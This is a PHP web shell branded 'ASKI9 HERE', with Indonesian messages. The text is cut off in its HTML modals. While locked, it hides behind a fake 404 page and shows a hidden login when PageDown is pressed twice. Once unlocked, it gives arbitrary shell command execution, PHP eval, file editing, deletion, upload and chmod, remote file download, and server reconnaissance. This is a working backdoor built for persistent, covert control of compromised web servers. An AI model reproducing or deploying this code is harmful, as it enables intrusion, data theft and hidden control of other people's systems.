<?php
 $AUTH_PASS = 'c2VyYmFzYWxhaA=='; // GANTI PASSWORD INI!
 $SESSION_NAME = 'gg_glass_' . md5(__FILE__);
session_name($SESSION_NAME);
session_start();

 $logged_in = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
if (isset($_POST['password'])) {
    if ($_POST['password'] === $AUTH_PASS) { $_SESSION['authenticated'] = true; $logged_in = true; }
    else { $login_error = true; }
}
if (isset($_GET['logout'])) { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }

function get_os() { return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'Windows' : 'Linux'; }
function get_user() { $u = get_current_user(); $fu = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : ''; return $fu ?: $u; }
function get_hostname_fn() { return gethostname() ?: php_uname('n'); }
function get_server_ip() { return $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()); }
function get_client_ip() { return $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; }
function format_size($b) { if ($b >= 1073741824) return number_format($b / 1073741824, 2) . ' GB'; if ($b >= 1048576) return number_format($b / 1048576, 2) . ' MB'; if ($b >= 1024) return number_format($b / 1024, 2) . ' KB'; return $b . ' B'; }
function get_perms_octal($f) { return substr(sprintf('%o', fileperms($f)), -4); }
function safe_path($path) { $path = str_replace('\\', '/', $path); $parts = array_filter(explode('/', $path), function($p) { return $p !== ''; }); $safe = []; foreach ($parts as $part) { if ($part === '..') array_pop($safe); elseif ($part !== '.') $safe[] = $part; } return '/' . implode('/', $safe); }
function execute_command($cmd, $cwd = null) { $is_win = get_os() === 'Windows'; $cmd = $is_win ? "cd /d \"$cwd\" & " . $cmd . " 2>&1" : "cd '" . addslashes($cwd) . "' 2>/dev/null; " . $cmd . " 2>&1"; if (function_exists('proc_open')) { $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($cmd, $d, $pipes); if (is_resource($p)) { fclose($pipes[0]); $r = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); return $r; } } if (function_exists('shell_exec')) return shell_exec($cmd); if (function_exists('exec')) { exec($cmd, $o); return implode("\n", $o); } if (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); } if (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); } return '[ERROR] Tidak ada fungsi eksekusi'; }
function delete_dir($dir) { if (!is_dir($dir)) return false; foreach (scandir($dir) as $i) { if ($i === '.' || $i === '..') continue; $p = $dir . '/' . $i; is_dir($p) ? delete_dir($p) : unlink($p); } return rmdir($dir); }

 $current_dir = isset($_GET['dir']) ? safe_path($_GET['dir']) : getcwd();
if (!is_dir($current_dir)) $current_dir = getcwd();

// ==================== AJAX HANDLER ====================
if (isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    $a = $_POST['ajax_action'];
    switch ($a) {
        case 'terminal': echo json_encode(['output' => execute_command($_POST['cmd'] ?? '', $_POST['cwd'] ?? getcwd())]); exit;
        case 'list_dir': $dir = safe_path($_POST['dir'] ?? getcwd()); if (!is_dir($dir)) { echo json_encode(['error' => 'Not found']); exit; } $items = []; foreach (@scandir($dir) as $e) { if ($e === '.') continue; $f = $dir === '/' ? '/' . $e : $dir . '/' . $e; $items[] = ['name'=>$e,'path'=>$f,'is_dir'=>is_dir($f),'size'=>is_file($f)?filesize($f):0,'perms'=>get_perms_octal($f),'owner'=>function_exists('posix_getpwuid')?(posix_getpwuid(fileowner($f))['name']??fileowner($f)):fileowner($f),'mtime'=>date('Y-m-d H:i:s',filemtime($f))]; } usort($items, function($a, $b) { if ($a['name']==='..') return -1; if ($b['name']==='..') return 1; if ($a['is_dir']&&!$b['is_dir']) return -1; if (!$a['is_dir']&&$b['is_dir']) return 1; return strcasecmp($a['name'], $b['name']); }); echo json_encode(['items'=>$items,'path'=>$dir]); exit;
        case 'read_file': $f = $_POST['file'] ?? ''; if (!file_exists($f)||!is_readable($f)) { echo json_encode(['error' => 'Gagal baca']); exit; } echo json_encode(['content'=>file_get_contents($f),'path'=>$f]); exit;
        case 'save_file': $f = $_POST['file'] ?? ''; $c = $_POST['content'] ?? ''; $ok = is_writable($f)||(!file_exists($f)&&is_writable(dirname($f))); echo json_encode(['success'=>$ok&&file_put_contents($f,$c)!==false]); exit;
        case 'delete': $t = $_POST['target'] ?? ''; echo json_encode(['success'=>file_exists($t)&&(is_dir($t)?delete_dir($t):unlink($t))]); exit;
        case 'delete_multi': $targets = $_POST['targets'] ?? []; $ok = true; foreach ($targets as $t) { if (!file_exists($t)) continue; if (is_dir($t)) { if (!delete_dir($t)) $ok = false; } else { if (!unlink($t)) $ok = false; } } echo json_encode(['success'=>$ok]); exit;
        case 'rename': echo json_encode(['success'=>rename($_POST['old']??'',$_POST['new']??'')]); exit;
        case 'chmod': echo json_encode(['success'=>chmod($_POST['target']??'',octdec($_POST['mode']??'644'))]); exit;
        case 'mkdir': $d=$_POST['dir']??'';$n=$_POST['name']??'';$full=$d==='/'?'/'.$n:$d.'/'.$n;echo json_encode(['success'=>mkdir($full,0755)]);exit;
        case 'touch': $d=$_POST['dir']??'';$n=$_POST['name']??'';$full=$d==='/'?'/'. $n:$d.'/'.$n;echo json_encode(['success'=>touch($full)]);exit;
        case 'upload': $d=$_POST['dir']??getcwd();if(!isset($_FILES['upfile'])||$_FILES['upfile']['error']!==UPLOAD_ERR_OK){$errCodes=[1=>'File terlalu besar (upload_max_filesize)',2=>'File terlalu besar (form max)',3=>'Upload terpotong',4=>'Tidak ada file',6=>'Missing temp folder',7=>'Gagal write disk',8=>'Diblokir extension'];echo json_encode(['success'=>false,'error'=>$errCodes[$_FILES['upfile']['error']??0]??'Error upload']);exit;}$dest=$d.'/'.basename($_FILES['upfile']['name']);echo json_encode(['success'=>move_uploaded_file($_FILES['upfile']['tmp_name'],$dest),'error'=>'']);exit;
        case 'unzip': $zip=$_POST['zip']??'';$dest=$_POST['dest']??'';if(!file_exists($zip)){echo json_encode(['success'=>false,'error'=>'ZIP tidak ditemukan']);exit;}$out=execute_command("unzip -o '".addslashes($zip)."' -d '".addslashes($dest)."'",getcwd());echo json_encode(['success'=>strpos($out,'inflating')!==false||strpos($out,'extracting')!==false,'output'=>$out]);exit;
        case 'remote_download': $url=$_POST['url']??'';$dest=$_POST['dest']??'';if(!$url||!$dest){echo json_encode(['success'=>false,'error'=>'Isi semua field']);exit;}$c=@file_get_contents($url);if($c===false)$c=execute_command("curl -sL '".addslashes($url)."'",getcwd());if($c===false||$c===''){echo json_encode(['success'=>false,'error'=>'Gagal download']);exit;}echo json_encode(['success'=>file_put_contents($dest,$c)!==false,'error'=>'']);exit;
        case 'eval_php': ob_start();eval($_POST['code']??'');echo json_encode(['output'=>ob_get_clean()]);exit;
        case 'sysinfo': $dt=disk_total_space('/');$df=disk_free_space('/');echo json_encode(['os'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'hostname'=>get_hostname_fn(),'user'=>get_user(),'server_ip'=>get_server_ip(),'client_ip'=>get_client_ip(),'server_sw'=>$_SERVER['SERVER_SOFTWARE']??'N/A','php_ver'=>phpversion(),'doc_root'=>$_SERVER['DOCUMENT_ROOT']??'N/A','script_path'=>__FILE__,'cwd'=>getcwd(),'disk_total'=>format_size($dt),'disk_free'=>format_size($df),'disk_used'=>format_size($dt-$df),'disk_pct'=>round(($dt-$df)/$dt*100,1),'disabled'=>ini_get('disable_functions')?:'None','safe_mode'=>ini_get('safe_mode')?'ON':'OFF','open_basedir'=>ini_get('open_basedir')?:'None','upload_max'=>ini_get('upload_max_filesize'),'memory_limit'=>ini_get('memory_limit'),'max_exec'=>ini_get('max_execution_time').'s','extensions'=>get_loaded_extensions()]);exit;
    }
    exit;
}

 $os_type = get_os();

// ==================== 404 FAKE PAGE ====================
if (!$logged_in) {
    http_response_code(404);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh;display:flex;flex-direction:column}
        header{background:#fff;border-bottom:1px solid #e0e0e0;padding:16px 40px;display:flex;align-items:center;gap:16px}
        .logo-icon{width:36px;height:36px;background:#e8e8e8;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:18px;color:#999}
        .logo-text{font-size:16px;font-weight:600;color:#555}
        main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px;text-align:center}
        .error-code{font-size:120px;font-weight:800;color:#d0d0d0;line-height:1;letter-spacing:-4px;margin-bottom:16px;user-select:none}
        .error-title{font-size:24px;font-weight:600;color:#444;margin-bottom:10px}
        .error-desc{font-size:15px;color:#888;max-width:460px;line-height:1.6;margin-bottom:32px}
        .error-actions{display:flex;gap:12px}
        .btn-404{padding:10px 24px;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none;transition:all .2s;border:1px solid #d0d0d0;background:#fff;color:#555}
        .btn-404:hover{background:#f0f0f0}
        .btn-404.primary{background:#333;color:#fff;border-color:#333}
        footer{padding:20px 40px;text-align:center;font-size:12px;color:#bbb;border-top:1px solid #e8e8e8;background:#fff}
        .spacer-top{height:200vh}
        .login-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
        .login-overlay.show{display:flex}
        @keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
        .login-card{background:rgba(35,35,55,0.95);border:1px solid rgba(255,215,0,0.5);border-radius:32px;padding:40px 36px;width:400px;box-shadow:0 24px 80px rgba(0,0,0,0.5);animation:slideUp .4s ease .1s both;position:relative;backdrop-filter:blur(20px)}
        .lock-icon{width:60px;height:60px;background:linear-gradient(135deg,rgba(255,204,0,0.25),rgba(255,136,0,0.15));border-radius:18px;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;border:1px solid rgba(255,215,0,0.4)}
        .lock-icon i{font-size:24px;color:#ffcc00}
        .login-card h2{text-align:center;font-size:22px;font-weight:800;background:linear-gradient(135deg,#ffcc00,#ff8800);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:6px}
        .login-card .sub{text-align:center;font-size:13px;color:rgba(255,255,255,0.5);margin-bottom:28px}
        .login-card input[type="password"]{width:100%;padding:14px 20px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,215,0,0.4);border-radius:50px;color:#fff;font-size:14px;font-family:inherit;outline:none;transition:all .2s}
        .login-card input[type="password"]:focus{border-color:#ffcc00;background:rgba(255,255,255,0.15);box-shadow:0 0 0 3px rgba(255,204,0,0.15)}
        .login-card input[type="password"]::placeholder{color:rgba(255,255,255,0.4)}
        .login-card button[type="submit"]{width:100%;padding:14px;margin-top:16px;background:linear-gradient(135deg,#ffcc00,#ff8800);color:#0a0b14;border:none;border-radius:50px;font-size:14px;font-weight:800;font-family:inherit;cursor:pointer;transition:all .2s;letter-spacing:0.5px}
        .login-card button[type="submit"]:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(255,204,0,0.3)}
        .error-msg{color:#ff6666;font-size:12px;text-align:center;margin-top:16px;font-weight:500}
        .close-login{position:absolute;top:18px;right:18px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);color:rgba(255,255,255,0.4);font-size:18px;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%}
        .close-login:hover{background:rgba(255,255,255,0.15);color:#fff}
    </style>
</head>
<body>
    <div class="spacer-top"></div>
    <header><div class="logo-icon"><?= substr(get_hostname_fn(),0,1) ?></div><span class="logo-text"><?= htmlspecialchars(get_hostname_fn()) ?></span></header>
    <main>
        <div class="error-code">404</div>
        <h1 class="error-title">Page Not Found</h1>
        <p class="error-desc">The requested URL was not found on this server. If you entered the URL manually please check your spelling and try again.</p>
        <div class="error-actions"><a href="/" class="btn-404 primary">Back to Home</a><button class="btn-404" onclick="history.back()">Go Back</button></div>
    </main>
    <footer>&copy; <?= date('Y') ?> Apache/2.4 Server at <?= htmlspecialchars($_SERVER['HTTP_HOST']??'') ?> Port <?= $_SERVER['SERVER_PORT']??80 ?></footer>
    <div class="login-overlay" id="loginOverlay">
        <div class="login-card">
            <button class="close-login" onclick="hideLogin()">&times;</button>
            <div class="lock-icon"><i class="fas fa-lock"></i></div>
            <h2>ASKI9 HERE</h2>
            <p class="sub">Masukkan password untuk melanjutkan</p>
            <form method="POST" autocomplete="off">
                <input type="password" name="password" placeholder="Enter password..." autofocus>
                <button type="submit">AUTHENTICATE</button>
            </form>
            <?php if (isset($login_error)): ?><div class="error-msg">Password salah!</div><?php endif; ?>
        </div>
    </div>
    <script>
        var pdc=0,pdt=null;
        document.addEventListener('keydown',function(e){if(e.key==='PageDown'){e.preventDefault();pdc++;clearTimeout(pdt);pdt=setTimeout(function(){pdc=0},800);if(pdc>=2){showLogin();pdc=0}}if(e.key==='Escape')hideLogin()});
        function showLogin(){document.getElementById('loginOverlay').classList.add('show');setTimeout(function(){var i=document.querySelector('.login-card input[type="password"]');if(i)i.focus()},200)}
        function hideLogin(){document.getElementById('loginOverlay').classList.remove('show')}
    </script>
</body>
</html>
<?php exit; } ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ ASKI9 HERE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:url('https://dash.takenupload.org/6a84d07a03df5') no-repeat center center fixed;background-size:cover;font-family:'Inter',sans-serif;min-height:100vh;position:relative;padding:20px}
        body::before{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);background-attachment:fixed;opacity:1;z-index:0}
        .main-wrapper{max-width:1600px;margin:0 auto;position:relative;z-index:2}
        .glass-card{background:rgba(35,35,55,0.8);backdrop-filter:blur(12px);border-radius:28px;border:1px solid rgba(255,215,0,0.35);box-shadow:0 8px 20px rgba(0,0,0,0.2)}
        .header{display:flex;justify-content:space-between;align-items:center;padding:15px 30px;margin-bottom:25px;background:rgba(35,35,55,0.85);backdrop-filter:blur(12px);border-radius:50px;border:1px solid rgba(255,215,0,0.45)}
        .logo h1{font-size:24px;font-weight:800;background:linear-gradient(135deg,#ffcc00,#ff8800);-webkit-background-clip:text;background-clip:text;color:transparent;letter-spacing:-0.5px}
        .header-info{display:flex;gap:16px;font-size:11px;color:rgba(255,255,255,0.5);font-family:monospace;align-items:center}
        .nav-buttons{display:flex;gap:12px}
        .nav-btn{background:rgba(255,204,0,0.2);backdrop-filter:blur(4px);border:1px solid rgba(255,215,0,0.4);color:#ffcc00;text-decoration:none;padding:8px 20px;border-radius:40px;font-size:12px;font-weight:600;transition:.2s;cursor:pointer;font-family:inherit}
        .nav-btn:hover{background:#ffcc00;color:#0a0b14;transform:translateY(-2px);border-color:#ffcc00}
        .nav-btn.exit:hover{background:#dc2626;color:#fff;border-color:#dc2626}
        .path-bar{padding:14px 24px;margin-bottom:20px;font-size:13px;font-family:monospace;background:rgba(35,35,55,0.75);backdrop-filter:blur(8px);border-radius:50px;color:#ffeedd;border:1px solid rgba(255,215,0,0.25)}
        .path-bar a{color:#ffcc00;text-decoration:none;font-weight:600;transition:.15s}
        .path-bar a:hover{color:#fff}
        .message{background:rgba(255,204,0,0.2);backdrop-filter:blur(8px);border-left:4px solid #ffcc00;padding:12px 20px;margin-bottom:15px;border-radius:16px;font-size:12px;color:#fff0cc;font-weight:500;transition:opacity .5s;display:none}
        .message.show{display:block}
        .editor-section{background:rgba(35,35,55,0.85);backdrop-filter:blur(12px);border-radius:28px;padding:25px;margin-bottom:20px;border:1px solid rgba(255,215,0,0.35);display:none}
        .editor-section.show{display:block}
        .editor-section h3{color:#ffcc00;margin-bottom:12px;font-size:16px;display:flex;align-items:center;gap:10px}
        .editor-section .editor-path{width:100%;padding:12px 20px;margin-bottom:12px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,215,0,0.4);border-radius:40px;color:#fff;font-size:12px;font-family:monospace;outline:none}
        .editor-section .editor-path:focus{border-color:#ffcc00;background:rgba(255,255,255,0.15)}
        .editor-section textarea{width:100%;height:400px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,215,0,0.4);border-radius:20px;padding:16px;font-family:monospace;color:#fff;font-size:13px;resize:none;outline:none;line-height:1.6;tab-size:4}
        .editor-section textarea:focus{border-color:#ffcc00}
        .editor-section textarea::-webkit-scrollbar{width:6px}
        .editor-section textarea::-webkit-scrollbar-thumb{background:#ffcc00;border-radius:4px}
        .editor-btns{display:flex;gap:10px;margin-top:14px}
        .editor-btns button{padding:10px 28px;border:none;border-radius:40px;font-weight:700;cursor:pointer;font-size:12px;font-family:inherit;transition:.2s}
        .btn-save{background:linear-gradient(135deg,#ffcc00,#ff8800);color:#0a0b14}
        .btn-save:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(255,204,0,0.3)}
        .btn-close-editor{background:rgba(255,255,255,0.1);color:#ffcc00;border:1px solid rgba(255,215,0,0.4)}
        .btn-close-editor:hover{background:rgba(255,255,255,0.15)}
        .tools-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:18px;margin-bottom:25px}
        .tool-card{background:rgba(35,35,55,0.75);backdrop-filter:blur(12px);border-radius:24px;overflow:hidden;border:1px solid rgba(255,215,0,0.35)}
        .tool-title{background:rgba(255,204,0,0.15);padding:12px 16px;font-weight:700;font-size:13px;display:flex;align-items:center;gap:8px;color:#ffcc00;border-bottom:1px solid rgba(255,215,0,0.25)}
        .tool-body{padding:16px}
        .tool-body input,.tool-body select,.tool-body textarea{width:100%;padding:10px 14px;margin-bottom:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,215,0,0.4);border-radius:40px;color:#fff;font-size:12px;transition:.2s;font-family:inherit;outline:none}
        .tool-body input:focus,.tool-body select:focus,.tool-body textarea:focus{border-color:#ffcc00;background:rgba(255,255,255,0.2)}
        .tool-body input::placeholder,.tool-body textarea::placeholder{color:rgba(255,255,255,0.4)}
        .tool-body select{appearance:none;cursor:pointer}
        .tool-body select option{background:#232337;color:#fff}
        .tool-body button{width:100%;padding:10px;background:linear-gradient(135deg,#ffcc00,#ff8800);border:none;border-radius:40px;color:#0a0b14;font-weight:800;cursor:pointer;font-size:12px;transition:.2s;font-family:inherit}
        .tool-body button:hover{transform:translateY(-2px);filter:brightness(1.05);box-shadow:0 5px 15px rgba(255,204,0,0.3)}
        .file-table{background:rgba(35,35,55,0.75);backdrop-filter:blur(12px);border-radius:28px;overflow:hidden;margin-bottom:25px;border:1px solid rgba(255,215,0,0.35)}
        .file-table-scroll{overflow-x:auto}
        .file-table-scroll::-webkit-scrollbar{height:6px}
        .file-table-scroll::-webkit-scrollbar-thumb{background:rgba(255,204,0,0.5);border-radius:4px}
        table{width:100%;border-collapse:collapse}
        th,td{padding:14px 16px;text-align:left;border-bottom:1px solid rgba(255,215,0,0.1);font-size:12px;color:#f0f0f0;white-space:nowrap}
        th{background:rgba(255,204,0,0.12);color:#ffcc00;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:0.5px}
        tr:hover{background:rgba(255,204,0,0.06)}
        .folder-link,.file-link{text-decoration:none;font-weight:600;cursor:pointer}
        .folder-link{color:#ffcc00}
        .file-link{color:#88ccff}
        .folder-link:hover{color:#ffe066}
        .file-link:hover{color:#aaddff}
        .action-btn{padding:4px 10px;border-radius:40px;font-size:10px;font-weight:600;display:inline-block;margin:2px 3px 2px 0;transition:.2s;text-decoration:none;cursor:pointer}
        .action-btn.edit{background:rgba(255,204,0,0.2);color:#ffcc00;border:1px solid rgba(255,204,0,0.35)}
        .action-btn.delete{background:rgba(220,60,60,0.25);color:#ffaaaa;border:1px solid rgba(220,60,60,0.35)}
        .action-btn.extract{background:rgba(34,197,94,0.25);color:#aaffaa;border:1px solid rgba(34,197,94,0.35)}
        .action-btn.open{background:rgba(59,130,246,0.25);color:#aaccff;border:1px solid rgba(59,130,246,0.35)}
        .action-btn:hover{transform:translateY(-1px);filter:brightness(1.15)}
        .delete-selected-btn{margin:15px 20px 20px;padding:10px 24px;background:linear-gradient(135deg,#dc2626,#991b1b);border:none;border-radius:40px;color:white;font-weight:700;cursor:pointer;font-size:12px;font-family:inherit;transition:.2s}
        .delete-selected-btn:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(220,38,38,0.3)}
        .terminal-output-bottom{background:rgba(35,35,55,0.75);backdrop-filter:blur(12px);border-radius:28px;overflow:hidden;border:1px solid rgba(255,215,0,0.35)}
        .terminal-output-title{background:rgba(255,204,0,0.12);padding:12px 20px;font-weight:700;color:#ffcc00;border-bottom:1px solid rgba(255,215,0,0.2);font-size:13px;display:flex;justify-content:space-between;align-items:center}
        .terminal-output-title button{background:rgba(255,255,255,0.1);border:1px solid rgba(255,215,0,0.3);color:#ffcc00;padding:4px 14px;border-radius:20px;font-size:10px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s}
        .terminal-output-title button:hover{background:rgba(255,255,255,0.15)}
        .terminal-output-content{padding:20px;background:rgba(0,0,0,0.25);font-family:monospace;font-size:12px;max-height:300px;min-height:60px;overflow-y:auto;white-space:pre-wrap;color:#ccffaa;line-height:1.6}
        .terminal-output-content::-webkit-scrollbar{width:6px}
        .terminal-output-content::-webkit-scrollbar-thumb{background:rgba(204,255,170,0.4);border-radius:4px}
        .term-cmd-line{color:#88ccff;margin-bottom:4px}
        .term-cmd-text{color:#ffcc00}
        .term-result{color:#ccffaa}
        .term-error{color:#ff8888}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);backdrop-filter:blur(6px);justify-content:center;align-items:center;z-index:1000}
        .modal.show{display:flex}
        .modal-content{background:rgba(35,35,55,0.95);backdrop-filter:blur(20px);border-radius:32px;padding:30px;max-width:420px;width:90%;border:1px solid rgba(255,215,0,0.5)}
        .modal-content h3{margin-bottom:20px;color:#ffcc00;font-size:18px;display:flex;align-items:center;gap:10px}
        .modal-content input,.modal-content textarea{width:100%;padding:12px 20px;margin:10px 0;border-radius:50px;border:1px solid rgba(255,215,0,0.4);background:rgba(255,255,255,0.1);color:#fff;font-size:13px;outline:none;font-family:inherit;transition:.2s}
        .modal-content input:focus,.modal-content textarea:focus{border-color:#ffcc00;background:rgba(255,255,255,0.15)}
        .modal-content input::placeholder{color:rgba(255,255,255,0.4)}
        .modal-btns{display:flex;gap:10px;justify-content:flex-end;margin-top:18px}
        .modal-btns button{padding:10px 24px;border:none;border-radius:40px;font-weight:700;cursor:pointer;font-size:12px;font-family:inherit;transition:.2s}
        .modal-btn-primary{background:linear-gradient(135deg,#ffcc00,#ff8800);color:#0a0b14}
        .modal-btn-primary:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(255,204,0,0.3)}
        .modal-btn-cancel{background:rgba(255,255,255,0.1);color:#ffcc00;border:1px solid rgba(255,215,0,0.4)}
        .modal-btn-cancel:hover{background:rgba(255,255,255,0.15)}
        input[type="checkbox"]{width:18px;height:18px;accent-color:#ffcc00;cursor:pointer}
        .file-input-hidden{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        ::-webkit-scrollbar{width:6px}
        ::-webkit-scrollbar-track{background:rgba(0,0,0,0.2);border-radius:4px}
        ::-webkit-scrollbar-thumb{background:rgba(255,204,0,0.5);border-radius:4px}
        @media(max-width:768px){
            body{padding:10px}
            .header{flex-wrap:wrap;gap:10px;padding:12px 18px;border-radius:28px}
            .header-info{display:none}
            .tools-bar{grid-template-columns:1fr 1fr}
            .nav-btn span.btn-text{display:none}
            .editor-section textarea{height:250px}
        }
    </style>
</head>
<body>
<div class="main-wrapper">
    <!-- HEADER -->
    <div class="header">
        <div class="logo"><h1><i class="fas fa-shield-halved" style="margin-right:6px"></i>ASKI9 HERE</h1></div>
        <div class="header-info">
            <span><i class="fas fa-user" style="margin-right:4px;color:#ffcc00"></i><?= get_user() ?></span>
            <span><i class="fas fa-server" style="margin-right:4px;color:#ffcc00"></i><?= $os_type ?></span>
            <span><i class="fab fa-php" style="margin-right:4px;color:#ffcc00"></i><?= phpversion() ?></span>
        </div>
        <div class="nav-buttons">
            <button class="nav-btn" onclick="loadDir(currentDir)"><i class="fas fa-rotate-right"></i> <span class="btn-text">REFRESH</span></button>
            <button class="nav-btn" onclick="showSysInfo()"><i class="fas fa-microchip"></i> <span class="btn-text">INFO</span></button>
            <button class="nav-btn" onclick="showEvalModal()"><i class="fab fa-php"></i> <span class="btn-text">EVAL</span></button>
            <a href="?logout=1" class="nav-btn exit"><i class="fas fa-right-from-bracket"></i> <span class="btn-text">EXIT</span></a>
        </div>
    </div>

    <!-- PATH BAR -->
    <div class="path-bar" id="pathBar">CURRENT PATH: loading...</div>

    <!-- MESSAGE -->
    <div class="message" id="msgArea"></div>

    <!-- EDITOR -->
    <div class="editor-section" id="editorSection">
        <h3><i class="fas fa-code"></i> FILE EDITOR</h3>
        <input type="text" class="editor-path" id="editorPath" placeholder="/path/ke/file">
        <textarea id="editorContent" spellcheck="false" placeholder="File content will appear here..."></textarea>
        <div class="editor-btns">
            <button class="btn-save" onclick="saveEditor()"><i class="fas fa-save"></i> SAVE</button>
            <button class="btn-close-editor" onclick="closeEditor()"><i class="fas fa-xmark"></i> CLOSE</button>
        </div>
    </div>

    <!-- TOOLS BAR -->
    <div class="tools-bar">
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-upload"></i> UPLOAD FILE</div>
            <div class="tool-body">
                <input type="file" id="uploadInput" multiple>
                <button onclick="doUpload()"><i class="fas fa-cloud-arrow-up"></i> UPLOAD</button>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-file-zipper"></i> EXTRACT ZIP</div>
            <div class="tool-body">
                <input type="text" id="unzipPath" placeholder="/path/to/file.zip">
                <button onclick="doUnzip()"><i class="fas fa-box-open"></i> EXTRACT</button>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-terminal"></i> TERMINAL</div>
            <div class="tool-body">
                <input type="text" id="termCmd" placeholder="Enter command..." autocomplete="off" onkeydown="if(event.key==='Enter')runCommand()">
                <button onclick="runCommand()"><i class="fas fa-play"></i> RUN</button>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-plus-circle"></i> CREATE</div>
            <div class="tool-body">
                <input type="text" id="createName" placeholder="Name" required>
                <select id="createType"><option value="file">File</option><option value="folder">Folder</option></select>
                <textarea id="createContent" placeholder="File content (optional)..." rows="2" style="border-radius:16px;margin-bottom:10px"></textarea>
                <button onclick="doCreate()"><i class="fas fa-plus"></i> CREATE</button>
            </div>
        </div>
        <div class="tool-card">
            <div class="tool-title"><i class="fas fa-cloud-arrow-down"></i> REMOTE DL</div>
            <div class="tool-body">
                <input type="text" id="remoteUrl" placeholder="https://example.com/file.zip">
                <input type="text" id="remoteName" placeholder="Filename (optional)">
                <button onclick="doRemote()"><i class="fas fa-download"></i> DOWNLOAD</button>
            </div>
        </div>
    </div>

    <!-- FILE TABLE -->
    <div class="file-table">
        <div class="file-table-scroll">
            <table>
                <thead>
                    <tr><th style="width:40px"><input type="checkbox" id="selectAll" onchange="toggleSelectAll(this.checked)"></th><th>NAME</th><th style="width:100px">SIZE</th><th style="width:80px">PERM</th><th style="width:160px">MODIFIED</th><th>ACTIONS</th></tr>
                </thead>
                <tbody id="fileBody"></tbody>
            </table>
        </div>
        <div id="deleteSelectedWrap" style="display:none"><button class="delete-selected-btn" onclick="deleteSelected()"><i class="fas fa-trash"></i> DELETE SELECTED</button></div>
    </div>

    <!-- TERMINAL OUTPUT -->
    <div class="terminal-output-bottom">
        <div class="terminal-output-title">
            <span><i class="fas fa-terminal" style="margin-right:8px"></i>COMMAND OUTPUT</span>
            <button onclick="clearTermOutput()"><i class="fas fa-eraser"></i> CLEAR</button>
        </div>
        <div class="terminal-output-content" id="termOutput">Ready for commands...\n</div>
    </div>
</div>

<!-- RENAME MODAL -->
<div class="modal" id="renameModal" onclick="if(event.target===this)this.classList.remove('show')">
    <div class="modal-content">
        <h3><i class="fas fa-pen"></i> Rename Item</h3>
        <input type="hidden" id="renameOld">
        <input type="text" id="renameNew" placeholder="New name" onkeydown="if(event.key==='Enter')doRename()">
        <div class="modal-btns">
            <button class="modal-btn-cancel" onclick="document.getElementById('renameModal').classList.remove('show')">CANCEL</button>
            <button class="modal-btn-primary" onclick="doRename()">RENAME</button>
        </div>
    </div>
</div>

<!-- CHMOD MODAL -->
<div class="modal" id="chmodModal" onclick="if(event.target===this)this.classList.remove('show')">
    <div class="modal-content">
        <h3><i class="fas fa-key"></i> Change Permissions</h3>
        <input type="hidden" id="chmodTarget">
        <input type="text" id="chmodValue" placeholder="e.g. 0755 or 644" onkeydown="if(event.key==='Enter')doChmod()">
        <div class="modal-btns">
            <button class="modal-btn-cancel" onclick="document.getElementById('chmodModal').classList.remove('show')">CANCEL</button>
            <button class="modal-btn-primary" onclick="doChmod()">APPLY</button>
        </div>
    </div>
</div>

